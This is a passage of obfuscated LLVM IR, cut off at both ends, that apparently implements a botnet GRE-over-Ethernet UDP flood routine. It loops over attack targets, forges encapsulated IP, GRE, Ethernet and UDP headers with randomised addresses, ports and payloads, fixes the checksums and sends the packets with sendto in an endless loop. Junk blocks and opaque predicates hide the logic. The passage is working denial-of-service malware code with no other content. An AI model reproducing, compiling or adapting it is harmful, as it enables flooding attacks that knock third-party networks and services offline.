  %291 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %290, i32 0, i32 9
  store i32 %289, i32* %291, align 4
  %292 = load i32, i32* @x.21
  %293 = load i32, i32* @y.22
  %294 = sub i32 %292, 1
  %295 = mul i32 %292, %294
  %296 = urem i32 %295, 2
  %297 = icmp eq i32 %296, 0
  %298 = icmp slt i32 %293, 10
  %299 = or i1 %297, %298
  br i1 %299, label %originalBBpart227, label %originalBB10alteredBB

originalBBpart227:                                ; preds = %originalBB10
  br label %300

; <label>:300:                                    ; preds = %originalBBpart227, %270
  %301 = load i16, i16* %16, align 2
  %302 = call zeroext i16 @htons(i16 zeroext %301) #7
  %303 = load %struct.udphdr*, %struct.udphdr** %26, align 8
  %304 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %303, i32 0, i32 0
  store i16 %302, i16* %304, align 2
  %305 = load i16, i16* %17, align 2
  %306 = call zeroext i16 @htons(i16 zeroext %305) #7
  %307 = load %struct.udphdr*, %struct.udphdr** %26, align 8
  %308 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %307, i32 0, i32 1
  store i16 %306, i16* %308, align 2
  %309 = load i32, i32* %18, align 4
  %310 = sext i32 %309 to i64
  %311 = add i64 8, %310
  %312 = trunc i64 %311 to i16
  %313 = call zeroext i16 @htons(i16 zeroext %312) #7
  %314 = load %struct.udphdr*, %struct.udphdr** %26, align 8
  %315 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %314, i32 0, i32 2
  store i16 %313, i16* %315, align 2
  br label %316

; <label>:316:                                    ; preds = %300
  %317 = load i32, i32* @x.21
  %318 = load i32, i32* @y.22
  %319 = sub i32 %317, 1
  %320 = mul i32 %317, %319
  %321 = urem i32 %320, 2
  %322 = icmp eq i32 %321, 0
  %323 = icmp slt i32 %318, 10
  %324 = or i1 %322, %323
  br i1 %324, label %originalBB29, label %originalBB29alteredBB

originalBB29:                                     ; preds = %originalBB29alteredBB, %316
  %325 = load i32, i32* %9, align 4
  %326 = add nsw i32 %325, 1
  store i32 %326, i32* %9, align 4
  %327 = load i32, i32* @x.21
  %328 = load i32, i32* @y.22
  %329 = sub i32 %327, 1
  %330 = mul i32 %327, %329
  %331 = urem i32 %330, 2
  %332 = icmp eq i32 %331, 0
  %333 = icmp slt i32 %328, 10
  %334 = or i1 %332, %333
  br i1 %334, label %originalBBpart242, label %originalBB29alteredBB

originalBBpart242:                                ; preds = %originalBB29
  br label %112

; <label>:335:                                    ; preds = %originalBBpart24
  br label %336

; <label>:336:                                    ; preds = %631, %335
  store i32 0, i32* %9, align 4
  br label %337

; <label>:337:                                    ; preds = %628, %336
  %338 = load i32, i32* %9, align 4
  %339 = load i8, i8* %5, align 1
  %340 = zext i8 %339 to i32
  %341 = icmp slt i32 %338, %340
  br i1 %341, label %342, label %631

; <label>:342:                                    ; preds = %337
  %343 = load i8**, i8*** %11, align 8
  %344 = load i32, i32* %9, align 4
  %345 = sext i32 %344 to i64
  %346 = getelementptr inbounds i8*, i8** %343, i64 %345
  %347 = load i8*, i8** %346, align 8
  store i8* %347, i8** %30, align 8
  %348 = load i8*, i8** %30, align 8
  %349 = bitcast i8* %348 to %struct.iphdr*
  store %struct.iphdr* %349, %struct.iphdr** %31, align 8
  %350 = load %struct.iphdr*, %struct.iphdr** %31, align 8
  %351 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %350, i64 1
  %352 = bitcast %struct.iphdr* %351 to %struct.grehdr*
  store %struct.grehdr* %352, %struct.grehdr** %32, align 8
  %353 = load %struct.grehdr*, %struct.grehdr** %32, align 8
  %354 = getelementptr inbounds %struct.grehdr, %struct.grehdr* %353, i64 1
  %355 = bitcast %struct.grehdr* %354 to %struct.ethhdr*
  store %struct.ethhdr* %355, %struct.ethhdr** %33, align 8
  %356 = load %struct.ethhdr*, %struct.ethhdr** %33, align 8
  %357 = getelementptr inbounds %struct.ethhdr, %struct.ethhdr* %356, i64 1
  %358 = bitcast %struct.ethhdr* %357 to %struct.iphdr*
  store %struct.iphdr* %358, %struct.iphdr** %34, align 8
  %359 = load %struct.iphdr*, %struct.iphdr** %34, align 8
  %360 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %359, i64 1
  %361 = bitcast %struct.iphdr* %360 to %struct.udphdr*
  store %struct.udphdr* %361, %struct.udphdr** %35, align 8
  %362 = load %struct.udphdr*, %struct.udphdr** %35, align 8
  %363 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %362, i64 1
  %364 = bitcast %struct.udphdr* %363 to i8*
  store i8* %364, i8** %36, align 8
  %365 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %366 = load i32, i32* %9, align 4
  %367 = sext i32 %366 to i64
  %368 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %365, i64 %367
  %369 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %368, i32 0, i32 2
  %370 = load i8, i8* %369, align 4
  %371 = zext i8 %370 to i32
  %372 = icmp slt i32 %371, 32
  br i1 %372, label %373, label %394

; <label>:373:                                    ; preds = %342
  %374 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %375 = load i32, i32* %9, align 4
  %376 = sext i32 %375 to i64
  %377 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %374, i64 %376
  %378 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %377, i32 0, i32 1
  %379 = load i32, i32* %378, align 4
  %380 = call i32 @ntohl(i32 %379) #7
  %381 = call i32 @rand_next()
  %382 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %383 = load i32, i32* %9, align 4
  %384 = sext i32 %383 to i64
  %385 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %382, i64 %384
  %386 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %385, i32 0, i32 2
  %387 = load i8, i8* %386, align 4
  %388 = zext i8 %387 to i32
  %389 = lshr i32 %381, %388
  %390 = add i32 %380, %389
  %391 = call i32 @htonl(i32 %390) #7
  %392 = load %struct.iphdr*, %struct.iphdr** %31, align 8
  %393 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %392, i32 0, i32 9
  store i32 %391, i32* %393, align 4
  br label %394

; <label>:394:                                    ; preds = %373, %342
  %395 = load i32, i32* @x.21
  %396 = load i32, i32* @y.22
  %397 = sub i32 %395, 1
  %398 = mul i32 %395, %397
  %399 = urem i32 %398, 2
  %400 = icmp eq i32 %399, 0
  %401 = icmp slt i32 %396, 10
  %402 = or i1 %400, %401
  br i1 %402, label %originalBB44, label %originalBB44alteredBB

originalBB44:                                     ; preds = %originalBB44alteredBB, %394
  %403 = load i32, i32* %21, align 4
  %404 = icmp eq i32 %403, -1
  %405 = load i32, i32* @x.21
  %406 = load i32, i32* @y.22
  %407 = sub i32 %405, 1
  %408 = mul i32 %405, %407
  %409 = urem i32 %408, 2
  %410 = icmp eq i32 %409, 0
  %411 = icmp slt i32 %406, 10
  %412 = or i1 %410, %411
  br i1 %412, label %originalBBpart246, label %originalBB44alteredBB

originalBBpart246:                                ; preds = %originalBB44
  br i1 %404, label %413, label %433

; <label>:413:                                    ; preds = %originalBBpart246
  %414 = load i32, i32* @x.21
  %415 = load i32, i32* @y.22
  %416 = sub i32 %414, 1
  %417 = mul i32 %414, %416
  %418 = urem i32 %417, 2
  %419 = icmp eq i32 %418, 0
  %420 = icmp slt i32 %415, 10
  %421 = or i1 %419, %420
  br i1 %421, label %originalBB48, label %originalBB48alteredBB

originalBB48:                                     ; preds = %originalBB48alteredBB, %413
  %422 = call i32 @rand_next()
  %423 = load %struct.iphdr*, %struct.iphdr** %31, align 8
  %424 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %423, i32 0, i32 8
  store i32 %422, i32* %424, align 4
  %425 = load i32, i32* @x.21
  %426 = load i32, i32* @y.22
  %427 = sub i32 %425, 1
  %428 = mul i32 %425, %427
  %429 = urem i32 %428, 2
  %430 = icmp eq i32 %429, 0
  %431 = icmp slt i32 %426, 10
  %432 = or i1 %430, %431
  br i1 %432, label %originalBBpart250, label %originalBB48alteredBB

originalBBpart250:                                ; preds = %originalBB48
  br label %433

; <label>:433:                                    ; preds = %originalBBpart250, %originalBBpart246
  %434 = load i16, i16* %13, align 2
  %435 = zext i16 %434 to i32
  %436 = icmp eq i32 %435, 65535
  br i1 %436, label %437, label %452

; <label>:437:                                    ; preds = %433
  %438 = call i32 @rand_next()
  %439 = and i32 %438, 65535
  %440 = trunc i32 %439 to i16
  %441 = load %struct.iphdr*, %struct.iphdr** %31, align 8
  %442 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %441, i32 0, i32 3
  store i16 %440, i16* %442, align 4
  %443 = load %struct.iphdr*, %struct.iphdr** %31, align 8
  %444 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %443, i32 0, i32 3
  %445 = load i16, i16* %444, align 4
  %446 = zext i16 %445 to i32
  %447 = sub nsw i32 %446, 1000
  %448 = xor i32 %447, -1
  %449 = trunc i32 %448 to i16
  %450 = load %struct.iphdr*, %struct.iphdr** %34, align 8
  %451 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %450, i32 0, i32 3
  store i16 %449, i16* %451, align 4
  br label %452

; <label>:452:                                    ; preds = %437, %433
  %453 = load i16, i16* %16, align 2
  %454 = zext i16 %453 to i32
  %455 = icmp eq i32 %454, 65535
  br i1 %455, label %456, label %462

; <label>:456:                                    ; preds = %452
  %457 = call i32 @rand_next()
  %458 = and i32 %457, 65535
  %459 = trunc i32 %458 to i16
  %460 = load %struct.udphdr*, %struct.udphdr** %35, align 8
  %461 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %460, i32 0, i32 0
  store i16 %459, i16* %461, align 2
  br label %462

; <label>:462:                                    ; preds = %456, %452
  %463 = load i16, i16* %17, align 2
  %464 = zext i16 %463 to i32
  %465 = icmp eq i32 %464, 65535
  br i1 %465, label %466, label %472

; <label>:466:                                    ; preds = %462
  %467 = call i32 @rand_next()
  %468 = and i32 %467, 65535
  %469 = trunc i32 %468 to i16
  %470 = load %struct.udphdr*, %struct.udphdr** %35, align 8
  %471 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %470, i32 0, i32 1
  store i16 %469, i16* %471, align 2
  br label %472

; <label>:472:                                    ; preds = %466, %462
  %473 = load i32, i32* @x.21
  %474 = load i32, i32* @y.22
  %475 = sub i32 %473, 1
  %476 = mul i32 %473, %475
  %477 = urem i32 %476, 2
  %478 = icmp eq i32 %477, 0
  %479 = icmp slt i32 %474, 10
  %480 = or i1 %478, %479
  br i1 %480, label %originalBB52, label %originalBB52alteredBB

originalBB52:                                     ; preds = %originalBB52alteredBB, %472
  %481 = load i8, i8* %20, align 1
  %482 = icmp ne i8 %481, 0
  %483 = load i32, i32* @x.21
  %484 = load i32, i32* @y.22
  %485 = sub i32 %483, 1
  %486 = mul i32 %483, %485
  %487 = urem i32 %486, 2
  %488 = icmp eq i32 %487, 0
  %489 = icmp slt i32 %484, 10
  %490 = or i1 %488, %489
  br i1 %490, label %originalBBpart254, label %originalBB52alteredBB

originalBBpart254:                                ; preds = %originalBB52
  br i1 %482, label %495, label %491

; <label>:491:                                    ; preds = %originalBBpart254
  %492 = call i32 @rand_next()
  %493 = load %struct.iphdr*, %struct.iphdr** %34, align 8
  %494 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %493, i32 0, i32 9
  store i32 %492, i32* %494, align 4
  br label %501

; <label>:495:                                    ; preds = %originalBBpart254
  %496 = load %struct.iphdr*, %struct.iphdr** %31, align 8
  %497 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %496, i32 0, i32 9
  %498 = load i32, i32* %497, align 4
  %499 = load %struct.iphdr*, %struct.iphdr** %34, align 8
  %500 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %499, i32 0, i32 9
  store i32 %498, i32* %500, align 4
  br label %501

; <label>:501:                                    ; preds = %495, %491
  %502 = load i32, i32* @x.21
  %503 = load i32, i32* @y.22
  %504 = sub i32 %502, 1
  %505 = mul i32 %502, %504
  %506 = urem i32 %505, 2
  %507 = icmp eq i32 %506, 0
  %508 = icmp slt i32 %503, 10
  %509 = or i1 %507, %508
  br i1 %509, label %originalBB56, label %originalBB56alteredBB

originalBB56:                                     ; preds = %originalBB56alteredBB, %501
  %510 = call i32 @rand_next()
  store i32 %510, i32* %37, align 4
  %511 = call i32 @rand_next()
  store i32 %511, i32* %38, align 4
  %512 = call i32 @rand_next()
  store i32 %512, i32* %39, align 4
  %513 = load %struct.ethhdr*, %struct.ethhdr** %33, align 8
  %514 = getelementptr inbounds %struct.ethhdr, %struct.ethhdr* %513, i32 0, i32 0
  %515 = getelementptr inbounds [6 x i8], [6 x i8]* %514, i32 0, i32 0
  %516 = bitcast i32* %37 to i8*
  call void @util_memcpy(i8* %515, i8* %516, i32 4)
  %517 = load %struct.ethhdr*, %struct.ethhdr** %33, align 8
  %518 = getelementptr inbounds %struct.ethhdr, %struct.ethhdr* %517, i32 0, i32 1
  %519 = getelementptr inbounds [6 x i8], [6 x i8]* %518, i32 0, i32 0
  %520 = bitcast i32* %38 to i8*
  call void @util_memcpy(i8* %519, i8* %520, i32 4)
  %521 = load %struct.ethhdr*, %struct.ethhdr** %33, align 8
  %522 = getelementptr inbounds %struct.ethhdr, %struct.ethhdr* %521, i32 0, i32 0
  %523 = getelementptr inbounds [6 x i8], [6 x i8]* %522, i32 0, i32 0
  %524 = getelementptr inbounds i8, i8* %523, i64 4
  %525 = bitcast i32* %39 to i8*
  call void @util_memcpy(i8* %524, i8* %525, i32 2)
  %526 = load %struct.ethhdr*, %struct.ethhdr** %33, align 8
  %527 = getelementptr inbounds %struct.ethhdr, %struct.ethhdr* %526, i32 0, i32 1
  %528 = getelementptr inbounds [6 x i8], [6 x i8]* %527, i32 0, i32 0
  %529 = getelementptr inbounds i8, i8* %528, i64 4
  %530 = bitcast i32* %39 to i8*
  %531 = getelementptr inbounds i8, i8* %530, i64 2
  call void @util_memcpy(i8* %529, i8* %531, i32 2)
  %532 = load i8, i8* %19, align 1
  %533 = icmp ne i8 %532, 0
  %534 = load i32, i32* @x.21
  %535 = load i32, i32* @y.22
  %536 = sub i32 %534, 1
  %537 = mul i32 %534, %536
  %538 = urem i32 %537, 2
  %539 = icmp eq i32 %538, 0
  %540 = icmp slt i32 %535, 10
  %541 = or i1 %539, %540
  br i1 %541, label %originalBBpart258, label %originalBB56alteredBB

originalBBpart258:                                ; preds = %originalBB56
  br i1 %533, label %542, label %545

; <label>:542:                                    ; preds = %originalBBpart258
  %543 = load i8*, i8** %36, align 8
  %544 = load i32, i32* %18, align 4
  call void @rand_str(i8* %543, i32 %544)
  br label %545

; <label>:545:                                    ; preds = %542, %originalBBpart258
  %546 = load i32, i32* @x.21
  %547 = load i32, i32* @y.22
  %548 = sub i32 %546, 1
  %549 = mul i32 %546, %548
  %550 = urem i32 %549, 2
  %551 = icmp eq i32 %550, 0
  %552 = icmp slt i32 %547, 10
  %553 = or i1 %551, %552
  br i1 %553, label %originalBB60, label %originalBB60alteredBB

originalBB60:                                     ; preds = %originalBB60alteredBB, %545
  %554 = load %struct.iphdr*, %struct.iphdr** %31, align 8
  %555 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %554, i32 0, i32 7
  store i16 0, i16* %555, align 2
  %556 = load %struct.iphdr*, %struct.iphdr** %31, align 8
  %557 = bitcast %struct.iphdr* %556 to i16*
  %558 = call zeroext i16 @checksum_generic(i16* %557, i32 20)
  %559 = load %struct.iphdr*, %struct.iphdr** %31, align 8
  %560 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %559, i32 0, i32 7
  store i16 %558, i16* %560, align 2
  %561 = load %struct.iphdr*, %struct.iphdr** %34, align 8
  %562 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %561, i32 0, i32 7
  store i16 0, i16* %562, align 2
  %563 = load %struct.iphdr*, %struct.iphdr** %34, align 8
  %564 = bitcast %struct.iphdr* %563 to i16*
  %565 = call zeroext i16 @checksum_generic(i16* %564, i32 20)
  %566 = load %struct.iphdr*, %struct.iphdr** %34, align 8
  %567 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %566, i32 0, i32 7
  store i16 %565, i16* %567, align 2
  %568 = load %struct.udphdr*, %struct.udphdr** %35, align 8
  %569 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %568, i32 0, i32 3
  store i16 0, i16* %569, align 2
  %570 = load %struct.iphdr*, %struct.iphdr** %34, align 8
  %571 = load %struct.udphdr*, %struct.udphdr** %35, align 8
  %572 = bitcast %struct.udphdr* %571 to i8*
  %573 = load %struct.udphdr*, %struct.udphdr** %35, align 8
  %574 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %573, i32 0, i32 2
  %575 = load i16, i16* %574, align 2
  %576 = load i32, i32* %18, align 4
  %577 = sext i32 %576 to i64
  %578 = add i64 8, %577
  %579 = trunc i64 %578 to i32
  %580 = call zeroext i16 @checksum_tcpudp(%struct.iphdr* %570, i8* %572, i16 zeroext %575, i32 %579)
  %581 = load %struct.udphdr*, %struct.udphdr** %35, align 8
  %582 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %581, i32 0, i32 3
  store i16 %580, i16* %582, align 2
  %583 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %584 = load i32, i32* %9, align 4
  %585 = sext i32 %584 to i64
  %586 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %583, i64 %585
  %587 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %586, i32 0, i32 0
  %588 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %587, i32 0, i32 0
  store i16 2, i16* %588, align 4
  %589 = load %struct.iphdr*, %struct.iphdr** %31, align 8
  %590 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %589, i32 0, i32 9
  %591 = load i32, i32* %590, align 4
  %592 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %593 = load i32, i32* %9, align 4
  %594 = sext i32 %593 to i64
  %595 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %592, i64 %594
  %596 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %595, i32 0, i32 0
  %597 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %596, i32 0, i32 2
  %598 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %597, i32 0, i32 0
  store i32 %591, i32* %598, align 4
  %599 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %600 = load i32, i32* %9, align 4
  %601 = sext i32 %600 to i64
  %602 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %599, i64 %601
  %603 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %602, i32 0, i32 0
  %604 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %603, i32 0, i32 1
  store i16 0, i16* %604, align 2
  %605 = load i32, i32* %10, align 4
  %606 = load i8*, i8** %30, align 8
  %607 = load i32, i32* %18, align 4
  %608 = sext i32 %607 to i64
  %609 = add i64 66, %608
  %610 = bitcast %union.__CONST_SOCKADDR_ARG* %40 to %struct.sockaddr**
  %611 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %612 = load i32, i32* %9, align 4
  %613 = sext i32 %612 to i64
  %614 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %611, i64 %613
  %615 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %614, i32 0, i32 0
  %616 = bitcast %struct.sockaddr_in* %615 to %struct.sockaddr*
  store %struct.sockaddr* %616, %struct.sockaddr** %610, align 8
  %617 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %40, i32 0, i32 0
  %618 = load %struct.sockaddr*, %struct.sockaddr** %617, align 8
  %619 = call i64 @sendto(i32 %605, i8* %606, i64 %609, i32 16384, %struct.sockaddr* %618, i32 16)
  %620 = load i32, i32* @x.21
  %621 = load i32, i32* @y.22
  %622 = sub i32 %620, 1
  %623 = mul i32 %620, %622
  %624 = urem i32 %623, 2
  %625 = icmp eq i32 %624, 0
  %626 = icmp slt i32 %621, 10
  %627 = or i1 %625, %626
  br i1 %627, label %originalBBpart276, label %originalBB60alteredBB

originalBBpart276:                                ; preds = %originalBB60
  br label %628

; <label>:628:                                    ; preds = %originalBBpart276
  %629 = load i32, i32* %9, align 4
  %630 = add nsw i32 %629, 1
  store i32 %630, i32* %9, align 4
  br label %337

; <label>:631:                                    ; preds = %337
  br label %336

; <label>:632:                                    ; preds = %originalBBpart2, %86
  ret void

originalBBalteredBB:                              ; preds = %originalBB, %92
  %633 = load i32, i32* %10, align 4
  %634 = call i32 @close(i32 %633)
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %112
  %635 = load i32, i32* %9, align 4
  %636 = load i8, i8* %5, align 1
  %637 = zext i8 %636 to i32
  %638 = icmp slt i32 %635, %637
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %186
  %639 = call zeroext i16 @htons(i16 zeroext 16384) #7
  %640 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %641 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %640, i32 0, i32 4
  store i16 %639, i16* %641, align 2
  br label %originalBB6

originalBB10alteredBB:                            ; preds = %originalBB10, %276
  %642 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %643 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %642, i32 0, i32 8
  %644 = load i32, i32* %643, align 4
  %_ = sub i32 0, %644
  %gen = add i32 %_, 1024
  %_11 = sub i32 0, %644
  %gen12 = add i32 %_11, 1024
  %_13 = sub i32 %644, 1024
  %gen14 = mul i32 %_13, 1024
  %_15 = shl i32 %644, 1024
  %_16 = shl i32 %644, 1024
  %_17 = sub i32 %644, 1024
  %gen18 = mul i32 %_17, 1024
  %_19 = sub i32 %644, 1024
  %gen20 = mul i32 %_19, 1024
  %645 = sub i32 %644, 1024
  %_21 = shl i32 %645, -1
  %_22 = sub i32 %645, -1
  %gen23 = mul i32 %_22, -1
  %_24 = sub i32 %645, -1
  %gen25 = mul i32 %_24, -1
  %646 = xor i32 %645, -1
  %647 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %648 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %647, i32 0, i32 9
  store i32 %646, i32* %648, align 4
  br label %originalBB10

originalBB29alteredBB:                            ; preds = %originalBB29, %316
  %649 = load i32, i32* %9, align 4
  %_30 = sub i32 0, %649
  %gen31 = add i32 %_30, 1
  %_32 = sub i32 %649, 1
  %gen33 = mul i32 %_32, 1
  %_34 = sub i32 0, %649
  %gen35 = add i32 %_34, 1
  %_36 = sub i32 0, %649
  %gen37 = add i32 %_36, 1
  %_38 = sub i32 0, %649
  %gen39 = add i32 %_38, 1
  %_40 = shl i32 %649, 1
  %650 = add nsw i32 %649, 1
  store i32 %650, i32* %9, align 4
  br label %originalBB29

originalBB44alteredBB:                            ; preds = %originalBB44, %394
  %651 = load i32, i32* %21, align 4
  %652 = icmp eq i32 %651, -1
  br label %originalBB44

originalBB48alteredBB:                            ; preds = %originalBB48, %413
  %653 = call i32 @rand_next()
  %654 = load %struct.iphdr*, %struct.iphdr** %31, align 8
  %655 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %654, i32 0, i32 8
  store i32 %653, i32* %655, align 4
  br label %originalBB48

originalBB52alteredBB:                            ; preds = %originalBB52, %472
  %656 = load i8, i8* %20, align 1
  %657 = icmp ne i8 %656, 0
  br label %originalBB52

originalBB56alteredBB:                            ; preds = %originalBB56, %501
  %658 = call i32 @rand_next()
  store i32 %658, i32* %37, align 4
  %659 = call i32 @rand_next()
  store i32 %659, i32* %38, align 4
  %660 = call i32 @rand_next()
  store i32 %660, i32* %39, align 4
  %661 = load %struct.ethhdr*, %struct.ethhdr** %33, align 8
  %662 = getelementptr inbounds %struct.ethhdr, %struct.ethhdr* %661, i32 0, i32 0
  %663 = getelementptr inbounds [6 x i8], [6 x i8]* %662, i32 0, i32 0
  %664 = bitcast i32* %37 to i8*
  call void @util_memcpy(i8* %663, i8* %664, i32 4)
  %665 = load %struct.ethhdr*, %struct.ethhdr** %33, align 8
  %666 = getelementptr inbounds %struct.ethhdr, %struct.ethhdr* %665, i32 0, i32 1
  %667 = getelementptr inbounds [6 x i8], [6 x i8]* %666, i32 0, i32 0
  %668 = bitcast i32* %38 to i8*
  call void @util_memcpy(i8* %667, i8* %668, i32 4)
  %669 = load %struct.ethhdr*, %struct.ethhdr** %33, align 8
  %670 = getelementptr inbounds %struct.ethhdr, %struct.ethhdr* %669, i32 0, i32 0
  %671 = getelementptr inbounds [6 x i8], [6 x i8]* %670, i32 0, i32 0
  %672 = getelementptr inbounds i8, i8* %671, i64 4
  %673 = bitcast i32* %39 to i8*
  call void @util_memcpy(i8* %672, i8* %673, i32 2)
  %674 = load %struct.ethhdr*, %struct.ethhdr** %33, align 8
  %675 = getelementptr inbounds %struct.ethhdr, %struct.ethhdr* %674, i32 0, i32 1
  %676 = getelementptr inbounds [6 x i8], [6 x i8]* %675, i32 0, i32 0
  %677 = getelementptr inbounds i8, i8* %676, i64 4
  %678 = bitcast i32* %39 to i8*
  %679 = getelementptr inbounds i8, i8* %678, i64 2
  call void @util_memcpy(i8* %677, i8* %679, i32 2)
  %680 = load i8, i8* %19, align 1
  %681 = icmp ne i8 %680, 0
  br label %originalBB56

originalBB60alteredBB:                            ; preds = %originalBB60, %545
  %682 = load %struct.iphdr*, %struct.iphdr** %31, align 8
  %683 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %682, i32 0, i32 7
  store i16 0, i16* %683, align 2
  %684 = load %struct.iphdr*, %struct.iphdr** %31, align 8
  %685 = bitcast %struct.iphdr* %684 to i16*
  %686 = call zeroext i16 @checksum_generic(i16* %685, i32 20)
  %687 = load %struct.iphdr*, %struct.iphdr** %31, align 8
  %688 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %687, i32 0, i32 7
  store i16 %686, i16* %688, align 2
  %689 = load %struct.iphdr*, %struct.iphdr** %34, align 8
  %690 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %689, i32 0, i32 7
  store i16 0, i16* %690, align 2
  %691 = load %struct.iphdr*, %struct.iphdr** %34, align 8
  %692 = bitcast %struct.iphdr* %691 to i16*
  %693 = call zeroext i16 @checksum_generic(i16* %692, i32 20)
  %694 = load %struct.iphdr*, %struct.iphdr** %34, align 8
  %695 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %694, i32 0, i32 7
  store i16 %693, i16* %695, align 2
  %696 = load %struct.udphdr*, %struct.udphdr** %35, align 8
  %697 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %696, i32 0, i32 3
  store i16 0, i16* %697, align 2
  %698 = load %struct.iphdr*, %struct.iphdr** %34, align 8
  %699 = load %struct.udphdr*, %struct.udphdr** %35, align 8
  %700 = bitcast %struct.udphdr* %699 to i8*
  %701 = load %struct.udphdr*, %struct.udphdr** %35, align 8
  %702 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %701, i32 0, i32 2
  %703 = load i16, i16* %702, align 2
  %704 = load i32, i32* %18, align 4
  %705 = sext i32 %704 to i64
  %_61 = shl i64 8, %705
  %_62 = sub i64 8, %705
  %gen63 = mul i64 %_62, %705
  %_64 = sub i64 0, 8
  %gen65 = add i64 %_64, %705
  %_66 = sub i64 8, %705
  %gen67 = mul i64 %_66, %705
  %706 = add i64 8, %705
  %707 = trunc i64 %706 to i32
  %708 = call zeroext i16 @checksum_tcpudp(%struct.iphdr* %698, i8* %700, i16 zeroext %703, i32 %707)
  %709 = load %struct.udphdr*, %struct.udphdr** %35, align 8
  %710 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %709, i32 0, i32 3
  store i16 %708, i16* %710, align 2
  %711 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %712 = load i32, i32* %9, align 4
  %713 = sext i32 %712 to i64
  %714 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %711, i64 %713
  %715 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %714, i32 0, i32 0
  %716 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %715, i32 0, i32 0
  store i16 2, i16* %716, align 4
  %717 = load %struct.iphdr*, %struct.iphdr** %31, align 8
  %718 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %717, i32 0, i32 9
  %719 = load i32, i32* %718, align 4
  %720 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %721 = load i32, i32* %9, align 4
  %722 = sext i32 %721 to i64
  %723 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %720, i64 %722
  %724 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %723, i32 0, i32 0
  %725 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %724, i32 0, i32 2
  %726 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %725, i32 0, i32 0
  store i32 %719, i32* %726, align 4
  %727 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %728 = load i32, i32* %9, align 4
  %729 = sext i32 %728 to i64
  %730 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %727, i64 %729
  %731 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %730, i32 0, i32 0
  %732 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %731, i32 0, i32 1
  store i16 0, i16* %732, align 2
  %733 = load i32, i32* %10, align 4
  %734 = load i8*, i8** %30, align 8
  %735 = load i32, i32* %18, align 4
  %736 = sext i32 %735 to i64
  %_68 = sub i64 66, %736
  %gen69 = mul i64 %_68, %736
  %_70 = shl i64 66, %736
  %_71 = sub i64 66, %736
  %gen72 = mul i64 %_71, %736
  %_73 = sub i64 66, %736
  %gen74 = mul i64 %_73, %736
  %737 = add i64 66, %736
